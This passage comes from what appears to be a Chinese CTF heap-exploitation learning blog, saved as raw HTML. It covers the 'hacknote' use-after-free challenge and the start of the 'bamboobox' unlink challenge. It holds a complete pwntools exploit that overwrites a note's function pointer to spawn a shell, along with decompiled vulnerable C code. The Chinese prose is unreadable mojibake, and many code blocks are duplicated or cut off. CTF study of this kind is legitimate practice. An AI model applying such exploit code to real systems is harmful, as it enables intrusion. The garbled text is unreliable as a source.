†ï¼Œå¤§å°ä¸è¦ç­‰äºnoteç»“æ„ä½“çš„å¤§å°</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs python">add(<span class="hljs-number">32</span>,<span class="hljs-string">"aaaa"</span>)<span class="hljs-comment">#0å·</span><br>add(<span class="hljs-number">32</span>,<span class="hljs-string">"bbbb"</span>)<span class="hljs-comment"><code class="language-hljs python">add(<span class="hljs-number">32</span>,<span class="hljs-string">"aaaa"</span>)<span class="hljs-comment">#0å·</span><br>add(<span class="hljs-number">32</span>,<span class="hljs-string">"bbbb"</span>)<span class="hljs-comment">#1å·</span><br></code></pre></td></tr></tbody></table></figure><p>ç„¶åå†freeæ‰è¿™ä¸¤ä¸ªå †ï¼Œå®é™…ä¸Šåˆ™æ˜¯freeæ‰äº†4ä¸ªå †ï¼Œä¸¤ä¸ªnoteç»“æ„ä½“ï¼Œä¸¤ä¸ªcontentéƒ¨åˆ†<br>noteç»“æ„ä½“çš„å¤§å°ä½äº0x10çš„fastbinï¼Œè€Œcontenéƒ¨åˆ†ä½äº0x18å¤„</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs python">dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number"><code class="language-hljs python">dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/9.jpg" alt=""><br>æ¥ä¸‹æ¥æˆ‘ä»¬å†mallocä¸€ä¸ªå¤§å°ä¸º8çš„å †(2å·å †)ï¼Œå¹¶ä¸”å°†å…¶contentèµ‹å€¼ä¸ºmagicçš„åœ°å€ï¼Œæ ¹æ®fastbinåè¿›å…ˆå‡ºçš„åŸåˆ™,2å·å †çš„noteç»“æ„ä½“å°±ä½äº1å·å †çš„noteç»“æ„ä½“å¤„ï¼Œcontentåˆ™ä½äº0å·å †çš„noteç»“æ„ä½“ä½ç½®</p><pre><code>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”|                                ||         content2(åŸnote0)      ||                                ||--------------------------------||                                ||         content0(freed)        ||                                ||--------------------------------||                                ||         note2(åŸnote1)         ||                                ||--------------------------------||                                ||         content0(freed)        ||                                |â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</code></pre><p>æˆ‘ä»¬çœ‹çœ‹æ­¤æ—¶çš„å †ç»“æ„<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/10.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°ï¼ŒåŸæœ¬note0ä¸­çš„print_note_contentå‡½æ•°æŒ‡é’ˆå·²ç»è¢«æ›¿æ¢æˆäº†magicå‡½æ•°åœ°å€ï¼Œåªè¦æˆ‘ä»¬printnote(0)ï¼Œå°±ç›¸å½“äºè°ƒç”¨äº†magicå‡½æ•°ï¼Œå³å¯getshell<br>å®Œæ•´expå¦‚ä¸‹</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>context.log_level=<span class="hljs-string">'debug'</span><br><span class="hljs-comment">#io=remote("node3.buuoj.cn",29741)</span><br>io=process(<span class="hljs-string">'./hacknote'</span>)<br>elf=ELF(<span class="hljs-string">'hacknote'</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">'Note size :'</span>)<br>    io.sendline(str(size))<br>    io.recvuntil(<span class="hljs-string">'Content :'</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">'Index :'</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">'Index :'</span>)<br>    io.sendline(str(index))<br><br>magic = <span class="hljs-number">0x08048945</span><br><br>add(<span class="hljs-number">32</span>,<span class="hljs-string">"aaaa"</span>)<br>add(<span class="hljs-number">32</span>,<span class="hljs-string">"bbbb"</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>,p32(magic))<br>gdb.attach(io)<br>show(<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>context.log_level=<span class="hljs-string">'debug'</span><br><span class="hljs-comment">#io=remote("node3.buuoj.cn",29741)</span><br>io=process(<span class="hljs-string">'./hacknote'</span>)<br>elf=ELF(<span class="hljs-string">'hacknote'</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">'Note size :'</span>)<br>    io.sendline(str(size))<br>    io.recvuntil(<span class="hljs-string">'Content :'</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">'Index :'</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">'Your choice :'</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">'Index :'</span>)<br>    io.sendline(str(index))<br><br>magic = <span class="hljs-number">0x08048945</span><br><br>add(<span class="hljs-number">32</span>,<span class="hljs-string">"aaaa"</span>)<br>add(<span class="hljs-number">32</span>,<span class="hljs-string">"bbbb"</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>,p32(magic))<br>gdb.attach(io)<br>show(<span class="hljs-number">0</span>)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h3><p>å°±ä¸ç»†è¯´unlinkçš„åŸç†äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå¸ˆå‚…çš„åšå®¢å¯ä»¥çœ‹ï¼Œç›´æ¥è¯´åˆ©ç”¨æ–¹æ³•<br>ä¼ªé€ ä¸€ä¸ªfakechunk0ï¼Œä½¿fakechunk0çš„fdæŒ‡é’ˆä¸º<code>&amp;ptr-0x18</code>,ä½¿å…¶bkä¸º<code>&amp;ptr-0x10</code>,å¹¶é€šè¿‡å †æº¢å‡ºä½¿ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †chunk1è®¤ä¸ºä¸Šä¸€ä¸ªå †æ˜¯ç©ºé—²çŠ¶æ€ã€‚æ„é€ å¥½ä¹‹åï¼Œå†freeæ‰chunk1ï¼Œæ ¹æ®unlinkåŸç†ï¼Œfakechunkä¹Ÿä¼šä¸€èµ·è¢«freeæ‰ï¼Œæ”»å‡»æ•ˆæœæ˜¯ptræœ€ç»ˆæŒ‡å‘äº†<code>&amp;ptr-0x18</code>å¤„</p><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/11.jpg" alt=""><br>64ä½ï¼Œåªå¼€å¯äº†canaryå’Œnxï¼Œæˆ‘ä»¬å¯ä»¥å¤å†™gotè¡¨<br>è¿è¡Œä¸€ä¸‹ï¼ŒæŸ¥çœ‹åŠŸèƒ½<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/12.jpg" alt=""><br>å¢åˆ æŸ¥æ”¹ï¼ŒåŠŸèƒ½é½äº†<br>IDAåˆ†æ </p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-comment">//main</span><br><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span><br></span>{<br>  _QWORD *v3; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);<br>  v3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *v3 = hello_message;<br>  v3[<span class="hljs-number">1</span>] = goodbye_message;<br>  ((<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">signed</span> __int64, _QWORD))*v3)(<span class="hljs-number">16L</span>L, <span class="hljs-number">0L</span>L);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);<br>    <span class="hljs-keyword">switch</span> ( atoi(&amp;buf) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        show_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        add_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        change_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        remove_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        ((<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span> *))v3[<span class="hljs-number">1</span>])(&amp;buf, &amp;buf);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>        <span class="hljs-keyword"><code class="language-hljs c"><span class="hljs-comment">//main</span><br><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span><br></span>{<br>  _QWORD *v3; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);<br>  v3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *v3 = hello_message;<br>  v3[<span class="hljs-number">1</span>] = goodbye_message;<br>  ((<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">signed</span> __int64, _QWORD))*v3)(<span class="hljs-number">16L</span>L, <span class="hljs-number">0L</span>L);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);<br>    <span class="hljs-keyword">switch</span> ( atoi(&amp;buf) )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        show_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        add_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        change_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        remove_item();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        ((<span class="hljs-keyword">void</span> (__fastcall *)(<span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span> *))v3[<span class="hljs-number">1</span>])(&amp;buf, &amp;buf);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild choice!!!"</span>);<br>        <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>mainå‡½æ•°é‡Œé¢ä¼šå…ˆmallocä¸€ä¸ª0x10å¤§å°(å®é™…ä¸Š0x20)çš„chunkç”¨æ¥å­˜æ”¾ä¸¤ä¸ªå‡½æ•°çš„æŒ‡é’ˆï¼Œè¿™æ²¡å•¥ç”¨<br>ç„¶åé€šè¿‡switché€‰æ‹©åŠŸèƒ½</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-comment">//add_item</span><br><span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">99</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the box is full"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);<br>    v2 = atoi(&amp;buf);<br>    <span class="hljs-keyword">if</span> ( !v2 )<br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;<br>    }<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>    {<br>      <span class="hljs-keyword">if</span> ( !*(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] )<br>      {<br>        itemlist[<span class="hljs-number">4</span> * i] = v2;<br>        *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(v2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the name of item:"</span>);<br>        *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] + (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)<span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *(<span class="hljs-keyword">void</span> **)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], v2)) = <span class="hljs-number">0</span>;<br>        ++num;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number"><code class="language-hljs c"><span class="hljs-comment">//add_item</span><br><span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">99</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the box is full"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);<br>    v2 = atoi(&amp;buf);<br>    <span class="hljs-keyword">if</span> ( !v2 )<br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;<br>    }<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>    {<br>      <span class="hljs-keyword">if</span> ( !*(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] )<br>      {<br>        itemlist[<span class="hljs-number">4</span> * i] = v2;<br>        *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(v2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the name of item:"</span>);<br>        *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] + (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)<span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *(<span class="hljs-keyword">void</span> **)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], v2)) = <span class="hljs-number">0</span>;<br>        ++num;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;<br>      }<br>    }<br>  }<br></code></pre></td></tr></tbody></table></figure><p>ä¸å¾—ä¸è¯´ä¼ªä»£ç çœ‹çš„è¿˜æ˜¯ç›¸å½“è®©äººå¤´å¤§çš„<br>æœ€å¤§èƒ½add100æ¬¡ï¼Œæœ‰ä¸€ä¸ªitemlistç»“æ„ä½“ï¼Œç»“æ„å¦‚ä¸‹</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span>{</span><br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> ;<br>    <span class="hljs-keyword"><code class="language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span>{</span><br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> ;<br>    <span class="hljs-keyword">char</span> *name ;<br>};<br></code></pre></td></tr></tbody></table></figure><p>ä¸ºäº†é˜²æ­¢ä»¥åé—å¿˜ä»”ç»†è®°å½•ä¸€æ¬¡<br>intæ˜¯4ä¸ªå­—èŠ‚</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-keyword">if</span> ( !*(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number"><code class="language-hljs c"><span class="hljs-keyword">if</span> ( !*(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] )<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸€å¥åˆ¤æ–­åˆ¤æ–­çš„æ˜¯itemç»“æ„ä½“ä¸­nameæŒ‡é’ˆæ˜¯å¦å­˜åœ¨ï¼Œé‚£ä¹ˆnameæŒ‡é’ˆçš„ä½ç½®åˆæ˜¯æ€ä¹ˆç¡®å®šçš„ï¼Œç»“åˆé¢˜ç›®è¯´æ˜ä¸€ä¸‹</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">0x6020c0 <itemlist>:    0x0000000000000018  0x0000000000603030<br>0x6020d0 <itemlist+16>: 0x0000000000000018  0x0000000000603050<br>0x6020e0 <itemlist+32>: 0x0000000000000000  0x0000000000000000<br>0x6020f0 <itemlist+48>: 0x0000000000000000  0x0000000000000000<br>0x602100 <itemlist+64>: 0x0000000000000000  0x0000000000000000<br></code></pre></td></tr></tbody></table></figure><p>64ä½ç¨‹åºï¼Œè¿™ä¹ˆä¸€è¡Œå°±æ˜¯16ä¸ªå­—èŠ‚ï¼Œç›¸å½“äº4ä¸ªint,å‡è®¾i=0<br>é‚£ä¹ˆï¼Œitemlist[i]å°±æ˜¯<code>00000018</code>è¿™å››ä¸ªå­—èŠ‚ï¼Œitemlist[i+1]å°±æ˜¯<code>00000018</code>å‰æ–¹çš„<code>00000000</code>è¿™å››ä¸ªå­—èŠ‚ï¼Œç›¸åº”çš„ï¼Œitemlist[i+2]å°±æ˜¯<code>00603030</code>è¿™å››ä¸ªå­—èŠ‚ï¼Œå¯¹åº”çš„å°±æ˜¯nameæŒ‡é’ˆ</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-comment">//show_item</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">show_item</span><span class="hljs-params">()</span><br></span>{<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( !num )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)i, *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>]);<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in"><code class="language-hljs c"><span class="hljs-comment">//show_item</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">show_item</span><span class="hljs-params">()</span><br></span>{<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( !num )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">99</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)i, *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>]);<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(byte_401089);<br>}<br></code></pre></td></tr></tbody></table></figure><p>showåŠŸèƒ½æ ¹æ®numç´¢å¼•å¯»æ‰¾å¯¹åº”çš„chunkï¼Œç„¶åè¾“å‡ºå¯¹çš„chunkç¼–å·å’Œå†…å®¹</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-comment">//change</span><br><span class="hljs-keyword">if</span> ( num )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);<br>    v2 = atoi(&amp;buf);<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * v2 + <span class="hljs-number">2</span>] )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>, &amp;buf);<br>      <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;nptr, <span class="hljs-number">8u</span>LL);<br>      v0 = atoi(&amp;nptr);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>, &amp;nptr);<br>      *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class="hljs-number">4</span> * v2 + <span class="hljs-number">2</span>] + (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)<span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *(<span class="hljs-keyword">void</span> **)&amp;itemlist[<span class="hljs-number">4</span> * v2 + <span class="hljs-number">2</span>], v0)) = <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span 